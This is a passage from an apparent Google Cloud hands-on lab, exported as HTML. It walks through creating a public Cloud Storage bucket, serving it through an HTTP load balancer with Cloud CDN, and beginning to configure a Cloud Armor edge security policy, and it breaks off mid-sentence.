cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h4 id='before-you-begin-3'><span>Before you begin</span></h4><ul><li><p><span>In Cloud Shell, set your Project ID and create an environment variable for it:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $PROJECT_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set project $PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='task-1-create-a-cloud-storage-bucket-and-upload-an-object-2'><span>Task 1. Create a Cloud Storage bucket and upload an object</span></h3><p><span>The Cloud Storage bucket will be the origin source for Cloud CDN.</span></p><ol start='' ><li><p><span>In the console, go to </span><strong><span>Navigation menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>)</span></strong><span> &gt; </span><strong><span>Cloud Storage</span></strong><span> &gt; </span><strong><span>Buckets</span></strong><span>.</span></p></li><li><p><span>To create a new Cloud Storage bucket, click </span><strong><span>CREATE</span></strong><span>.</span></p></li><li><p><span>Set the bucket name as </span><code>Bucket Name</code></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location type</span></strong><span>, select </span><code>Region</code><span>, and choose </span><code>Bucket Region</code></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>The default storage class for your bucket is </span><code>Standard</code><span>. Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Uncheck </span><code>Enforce public access prevention on this bucket</code><span> checkbox under </span><strong><span>Prevent public access</span></strong><span>.</span></p></li><li><p><span>Choose </span><strong><span>Fine-grained</span></strong><span> under </span><strong><span>Access Control</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>That&#39;s it — you&#39;ve just created a Cloud Storage bucket!</span></p><h4 id='upload-an-object-to-the-bucket-2'><span>Upload an Object to the bucket</span></h4><p><span>Now upload an object into the bucket, which you will use later. By default, Cloud Storage buckets are private. As part of this lab, you will make the object available to the Internet.</span></p><ol start='' ><li><p><span>Run the following command in Cloud Shell, to download an image to Cloud Shell. A Google image from the Google homepage is used for this lab.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget --output-document google.png https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Use the </span><code>gsutil cp</code><span> command to upload the image from the Cloud Shell to the bucket you created:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp google.png gs://Bucket Name</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Remove the downloaded image from Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rm google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Locate the object you have uploaded to the bucket by navigating to </span><strong><span>Cloud Storage &gt; Buckets &gt; </span><code>Bucket Name</code></strong><span>.</span></p></li><li><p><span>Now, click on the three dots on the right side of the object you uploaded and click </span><strong><span>Edit access</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Add Entry</span></strong><span> and set the entity as </span><strong><span>Public</span></strong><span> from the drop-down list.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><img src="images\b7J%2FDa%2FQs1ii9RJbtLB9PEBijeY9rdhukZsgf0V76Y0%3D" referrerpolicy="no-referrer" alt="Edit access page, which lists the entities and includes the Save and Cancel buttons"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a Cloud Storage Bucket and upload an object</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-2-create-a-load-balancer-2'><span>Task 2. Create a Load Balancer</span></h3><p><span>Cloud CDN and Cloud Armor are components that can be tied to Google&#39;s global </span><a href='https://cloud.google.com/load-balancing'><span>Cloud Load Balancing</span></a><span>. In this section, you create an HTTP Load balancer.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Network services</span></strong><span> &gt; </span><strong><span>Load Balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+CREATE LOAD BALANCER</span></strong><span>.</span></p></li><li><p><span>Under Type of </span><strong><span>load balancer</span></strong><span>, select </span><strong><span>Application Load Balancer (HTTP/HTTPS)</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Public facing or internal</span></strong><span>, select </span><strong><span>Public facing (external)</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Global or single region deployment</span></strong><span>, select </span><strong><span>Best for global workloads</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Load balancer generation</span></strong><span>, select </span><strong><span>Global external Application Load Balancer</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>CONFIGURE</span></strong><span> button.</span></p></li><li><p><span>Name the load balancer as </span><code>edge-cache-lb</code><span>.</span></p></li></ol><h4 id='create-frontend-configuration-2'><span>Create frontend configuration</span></h4><p><span>To create the frontend configuration:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>For the frontend configuration use HTTP (though HTTPS also works if you have a certificate) and an ephemeral IP address and ensure that you have selected the premium tier network. This is by default.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><img src="images\W%2Ftq7MRoTnPDw%2Bvl3uNSZwxbwFEE1txmCee%2FHTIZ8yM%3D" referrerpolicy="no-referrer" alt="Frontend configuration page, which includes the load balancer's description"></p><h4 id='create-backend-configuration-2'><span>Create backend configuration</span></h4><p><span>To create the backend configuration:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend services &amp; backend buckets</span></strong><span>, click </span><strong><span>Create a backend bucket</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Backend bucket name</span></strong><span> to </span><code>lb-backend-bucket</code><span>.</span></p></li><li><p><span>In the next field, select the Cloud Storage bucket created earlier by clicking the </span><strong><span>Browse</span></strong><span> button.</span></p></li><li><p><span>Leave all other values at their defaults.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='create-host-and-path-rules-2'><span>Create host and path rules</span></h4><p><span>To create host and path rules:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Routing rules</span></strong><span> on the left.</span></p></li><li><p><span>Select </span><strong><span>simple host and path rule</span></strong><span> under Mode to send any request to the bucket. This is the default option.</span></p></li></ol><h4 id='review-and-create-the-http-load-balancer-4'><span>Review and create the HTTP Load Balancer</span></h4><p><span>To review and create the HTTP Load Balancer:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Review and finalize</span></strong><span>.</span></p></li><li><p><span>Review the </span><strong><span>Backend services</span></strong><span> and </span><strong><span>Frontend</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='get-load-balancer-ip-2'><span>Get Load Balancer IP</span></h4><p><span>To get the Load Balancer IP from the console:</span></p><ul><li><p><span>Click the load balancer name in the list of load balancers for the project. Note the IPv4 address of the load balancer for the next task. Refer to it as </span><code>[LOAD_BALANCER_IP]</code><span>.</span></p></li></ul><p><img src="images\gEIAdRhQ0Wllm2LutPBRlMAcAgXNbrZH%2FUMny9AgaGI%3D" referrerpolicy="no-referrer" alt="The Details page, which includes the highlighted IP:Port address"></p><h4 id='query-the-load-balancer-2'><span>Query the Load Balancer</span></h4><p><span>After a couple minutes, query the load balancer for the object you uploaded. You will need the load balancer IP address and the name of the image.</span></p><ol start='' ><li><p><span>Run the following from CloudShell and replace the LOAD_BALANCER_IP with the IPv4 address of the load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://LOAD_BALANCER_IP/google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> It might take up to 5 minutes to access the HTTP Load Balancer.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* &nbsp; Trying 34.98.81.123...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* TCP_NODELAY set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; GET /google.png HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Host: YOUR_IP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; User-Agent: curl/7.64.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Accept: */*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; HTTP/1.1 200 OK</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; X-GUploader-UploadID: ADPycdtoILI76KVsvBvdVGvSfzaxys1m3zYqCepBrmJxAI48ni24cWCRIdNu-53PX3DS6iycxp6xwFbMpwtcHHZQUQmEBxAgng</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Expires: Mon, 13 Dec 2021 22:58:26 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Date: Mon, 13 Dec 2021 21:58:26 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Cache-Control: public, max-age=3600</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; ETag: "8f9327db2597fa57d2f42b4a6c5a9855"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-generation: 1639431957957903</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-metageneration: 2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-stored-content-encoding: identity</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-stored-content-length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Type: image/png</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-hash: crc32c=TeiHTA==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-storage-class: STANDARD</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Accept-Ranges: bytes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Server: UploadServer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 630px;"></div><div class="CodeMirror-gutters" style="display: none; height: 630px;"></div></div></div></pre><ol start='' ><li><p><span>Run a few queries with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">for i in `seq 1 50`; do curl http://LOAD_BALANCER_IP/google.png; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='confirm-content-served-by-cloud-cdn-2'><span>Confirm content served by Cloud CDN</span></h4><ul><li><p><span>Validate that your content is being served from the CDN via CDN or Load Balancing Monitoring by navigating to </span><strong><span>Network Services &gt; Cloud CDN</span></strong><span>.</span></p></li></ul><p><img src="images\7UEDVoyLD6cXCvf7GPS11Wg9EXVz0WD57IqpPKT3ocM%3D" referrerpolicy="no-referrer" alt="Cloud CDN overview page, with one result populated"></p><p><span>You should be able to get close to a 100% hit ratio.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-3-delete-the-object-from-cloud-storage-bucket-2'><span>Task 3. Delete the object from Cloud Storage bucket</span></h3><p><span>Now that the cache is populated, delete the object from the bucket. This will reinfore that you are applying the policy to the cache and not the backend.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Cloud Storage &gt; Buckets &gt; </span><code>Bucket Name</code></strong><span>.</span></p></li><li><p><span>Select the object and delete it by clicking the </span><strong><span>Delete</span></strong><span> button at the top.</span></p></li><li><p><span>Click </span><strong><span>Delete</span></strong><span> at the prompt.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Delete the object from Cloud Storage bucket</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-4-create-an-edge-security-policy-2'><span>Task 4. Create an edge security policy</span></h3><p><span>Cloud Armor policies are substantiated outside of the HTTP Load Balancer. Once the Cloud Armor policy is deployed, you can then associate it with one or more HTTP Load Balancer Backend Service or Bucket resources, referred to as a Target.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Network Security &gt; Cloud Armor policies</span></strong><span> and click </span><strong><span>Create Policy</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults and click </span><strong><span>Next Step</span></strong><span>:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>edge-security-policy</span></td></tr><tr><td style='text-align:left;' ><span>Policy type</span></td><td style='text-align:left;' ><span>Edge security policy</span></td></tr><tr><td style='text-align:left;' ><span>Default rule action</span></td><td style='text-align:left;' ><span>Deny</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>In </span><strong><span>Apply policy to targets</span></strong><span> section, click </span><strong><span>Add Target</span></strong><span> and set the following values:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Type 1</span></td><td style='text-align:left;' ><span>Backend bucket (external application load balancer)</span></td></tr><tr><td style='text-align:left;' ><span>Backend Bucket target 1</span></td><td style='text-align:left;' ><span>lb-backend-bucket</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Policy</span></strong><span>.</span></p></li></ol><h4 id='validate-edge-security-policy-2'><span>Validate Edge Security Policy</span></h4><p><span>Now that you&#39;ve created an edge security policy in front of the back-end bucket, validate that it works as expected.</span></p><h5 id='check-the-security-policy-2'><span>Check the security policy</span></h5><p><span>After a few minutes have passed, you can check that the Cloud Armor policy is running.</span></p><p><span>From the command line, run the 